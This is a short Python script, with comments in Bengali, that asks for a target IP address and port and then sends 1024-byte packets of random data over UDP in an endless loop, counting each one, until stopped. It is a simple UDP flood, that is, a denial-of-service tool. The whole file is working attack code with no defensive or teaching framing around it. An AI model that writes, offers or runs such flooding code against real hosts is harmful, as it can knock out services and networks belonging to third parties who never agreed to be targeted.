import socket
import random

# টার্গেট IP এবং পোর্ট
ip = input("Enter IP address (e.g. 127.0.0.1): ")
port = int(input("Enter port (e.g. 8080): "))

# UDP socket তৈরি
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ডেটা বানানো (random bytes)
data = random._urandom(1024)

print("Sending packets... Press Ctrl+C to stop.")

sent = 0
try:
    while True:
        sock.sendto(data, (ip, port))
        sent += 1
        print(f"Sent {sent} packet to {ip} through port {port}")
except KeyboardInterrupt:
    print("\nStopped.")
   